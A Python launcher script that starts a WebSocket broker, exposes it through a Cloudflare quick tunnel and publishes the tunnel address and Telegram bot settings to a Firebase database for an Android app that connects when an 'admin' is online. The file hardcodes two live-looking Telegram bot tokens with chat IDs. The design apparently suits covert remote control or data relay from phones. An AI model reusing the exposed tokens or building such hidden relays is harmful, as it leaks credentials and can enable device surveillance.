import subprocess
import re
import sys
import os
import time
import socket
import platform

# ─── Config ───────────────────────────────────────────────────────────────────
FIREBASE_RTDB_URL = "https://camm-c9aff-default-rtdb.firebaseio.com"
PORT = 8765

# ─── Telegram Config ──────────────────────────────────────────────────────────
# These will be automatically synced with Firebase on startup.
# The Android app fetches them from Firebase so you never need to rebuild the APK.
TELEGRAM_BOTS = [
    {
        "botToken": "8012742505:AAGACKj2xt-4Ph-waCvuMoOmLc-CxwMazB8",
        "chatId": "1975037313"
    },
    {
        "botToken": "8688341841:AAEYNdmn2AJ8JWNcqexp9i4JXyTx7FNux28",
        "chatId": "8684439200"
    }
]

# ─── Print Termux Instructions ────────────────────────────────────────────────
def print_termux_help():
    print("=" * 60)
    print(" 📱 TERMUX SERVER RUNNER")
    print("=" * 60)
    print("To run this server on your mobile device inside Termux, make sure")
    print("you have run the following setup commands inside Termux:")
    print("  1. pkg update && pkg upgrade -y")
    print("  2. pkg install python cloudflared -y")
    print("  3. pip install websockets requests")
    print("=" * 60 + "\n")

# ─── Auto-install dependencies ────────────────────────────────────────────────
def ensure_deps():
    # 1. Install missing Python pip packages
    required = ["websockets", "requests"]
    for pkg in required:
        try:
            __import__(pkg)
        except ImportError:
            print(f"[*] Installing missing package: {pkg}...")
            # Using sys.executable to ensure we use the current Python environment
            subprocess.check_call([sys.executable, "-m", "pip", "install", pkg, "-q"])

    # 2. Install missing system package 'cloudflared' if running inside Android Termux
    is_termux = "com.termux" in os.environ.get("PREFIX", "") or os.path.exists("/data/data/com.termux")
    if is_termux:
        import shutil
        if shutil.which("cloudflared") is None:
            print("[*] Termux environment detected. 'cloudflared' system binary is missing.", flush=True)
            print("[*] Automatically installing 'cloudflared' package via Termux pkg manager...", flush=True)
            try:
                subprocess.check_call(["pkg", "install", "cloudflared", "-y"])
                print("[+] 'cloudflared' successfully installed!", flush=True)
            except Exception as e:
                print(f"[-] Auto-installation of 'cloudflared' failed: {e}", flush=True)
                print("[!] Please install manually inside Termux using: pkg install cloudflared -y", flush=True)

# ─── Free port if already in use (Termux / Linux / Windows) ───────────────────
def free_port(port):
    """Kill any process already listening on the given port."""
    if platform.system() == "Windows":
        try:
            result = subprocess.run(
                ["netstat", "-ano"],
                capture_output=True, text=True
            )
            for line in result.stdout.splitlines():
                if f":{port} " in line and "LISTENING" in line:
                    pid = line.strip().split()[-1]
                    subprocess.run(["taskkill", "/F", "/PID", pid], capture_output=True)
                    print(f"[*] Freed port {port} (killed PID {pid})", flush=True)
                    time.sleep(1)
                    break
        except Exception as e:
            print(f"[!] Could not free port {port}: {e}", flush=True)
    else:
        # Linux / Android Termux environment
        try:
            # Try using fuser
            subprocess.run(["fuser", "-k", f"{port}/tcp"], capture_output=True)
        except Exception:
            pass
        try:
            # Try using lsof and kill
            res = subprocess.run(["lsof", "-t", f"-i:{port}"], capture_output=True, text=True)
            pids = res.stdout.strip().split()
            for pid in pids:
                if pid:
                    subprocess.run(["kill", "-9", pid], capture_output=True)
            print(f"[*] Freed port {port} (killed listener process)", flush=True)
            time.sleep(1)
        except Exception as e:
            pass

# ─── Wait until server is actually listening ──────────────────────────────────
def wait_for_server(port, timeout=15):
    print(f"[*] Waiting for server to be ready on port {port}...", flush=True)
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            with socket.create_connection(("127.0.0.1", port), timeout=1):
                print(f"[+] Server is UP on port {port}!", flush=True)
                return True
        except (ConnectionRefusedError, OSError):
            time.sleep(0.5)
    return False

# ─── Firebase helpers ─────────────────────────────────────────────────────────
def firebase_put(path, value):
    """Write a value to a Firebase RTDB path."""
    import requests as req
    try:
        url = f"{FIREBASE_RTDB_URL}/{path}.json"
        if value is None:
            r = req.delete(url, timeout=5)
        else:
            r = req.put(url, json=value, timeout=5)
        if r.status_code not in (200, 204):
            print(f"[-] Firebase {path} failed ({r.status_code}): {r.text}", flush=True)
        return r.status_code in (200, 204)
    except Exception as e:
        print(f"[-] Firebase error on {path}: {e}", flush=True)
        return False

def reset_firebase_on_startup():
    """Put Firebase into a clean 'server not ready' state."""
    print("[*] Resetting Firebase state (serverUrl=null, adminOnline=false)...", flush=True)
    firebase_put("config/adminOnline", False)
    firebase_put("config/serverUrl", None)
    print("[+] Firebase reset complete.\n", flush=True)

def setup_telegram_config():
    """Write Telegram bot config to Firebase so the Android app can fetch it."""
    if not TELEGRAM_BOTS:
        print("[!] Telegram config not set — skipping Firebase write.", flush=True)
        return

    print("[*] Writing Telegram config to Firebase...", flush=True)
    # Write list of bots
    ok = firebase_put("config/telegrams", TELEGRAM_BOTS)
    # Write first bot for backward compatibility
    firebase_put("config/telegram", TELEGRAM_BOTS[0])
    
    if ok:
        print(f"[+] Telegram config written to Firebase ({len(TELEGRAM_BOTS)} bots)\n", flush=True)
    else:
        print("[-] Failed to write Telegram config to Firebase.\n", flush=True)

def update_firebase(tunnel_url):
    """Publish the new tunnel URL to Firebase."""
    ws_url = tunnel_url.replace("https://", "wss://")
    print(f"\n[*] Publishing tunnel URL to Firebase: {ws_url}", flush=True)
    ok = firebase_put("config/serverUrl", ws_url)
    if ok:
        print("[+] Firebase serverUrl updated! App will connect when admin comes online.\n", flush=True)

# ─── Main ─────────────────────────────────────────────────────────────────────
def main():
    print_termux_help()
    ensure_deps()
    free_port(PORT)

    reset_firebase_on_startup()
    setup_telegram_config()

    script_dir = os.path.dirname(os.path.abspath(__file__))
    server_script = os.path.join(script_dir, "server.py")

    print("[*] Starting WebSocket broker (server.py)...", flush=True)
    server_proc = subprocess.Popen(
        [sys.executable, "-u", server_script],
        stdout=sys.stdout,
        stderr=sys.stderr,
    )

    if not wait_for_server(PORT, timeout=15):
        print("\n[!!!] SERVER FAILED TO START on port", PORT, flush=True)
        server_proc.terminate()
        sys.exit(1)

    url_found = False

    try:
        while True:
            print(f"\n[*] Starting Cloudflare Tunnel...", flush=True)
            
            # Executable name defaults to cloudflared (in system PATH)
            cmd = ["cloudflared", "tunnel", "--no-autoupdate", "--url", f"http://127.0.0.1:{PORT}"]

            tunnel_proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                encoding="utf-8",
                errors="replace",
            )

            url_pattern   = re.compile(r"https://[a-zA-Z0-9][a-zA-Z0-9]*(?:-[a-zA-Z0-9]+)+\.trycloudflare\.com")
            error_pattern = re.compile(
                r"(ERR.*registering|ERR.*edge|Tunnel server stopped|Initiating shutdown"
                r"|context deadline exceeded|failed to request quick Tunnel"
                r"|Unable to reach|TLS handshake timeout)",
                re.IGNORECASE
            )

            try:
                for line in tunnel_proc.stdout:
                    line = line.rstrip()
                    print(f"[Cloudflared] {line}", flush=True)

                    if not url_found:
                        m = url_pattern.search(line)
                        if m:
                            url_found = True
                            print("[*] Tunnel URL found. Waiting 5s for DNS to propagate...", flush=True)
                            time.sleep(5)
                            update_firebase(m.group(0))

                    if error_pattern.search(line):
                        print(f"[!] Tunnel error detected: {line.strip()}", flush=True)
                        tunnel_proc.terminate()
                        break

            except Exception as e:
                print(f"[!] Exception reading tunnel stdout: {e}", flush=True)
                tunnel_proc.terminate()

            tunnel_proc.wait()
            print("[*] Tunnel disconnected. Retrying in 5 seconds...", flush=True)
            time.sleep(5)
            url_found = False

    except KeyboardInterrupt:
        print("\n[*] Shutting down...", flush=True)
    finally:
        print("[*] Terminating WebSocket broker...", flush=True)
        server_proc.terminate()

if __name__ == "__main__":
    main()
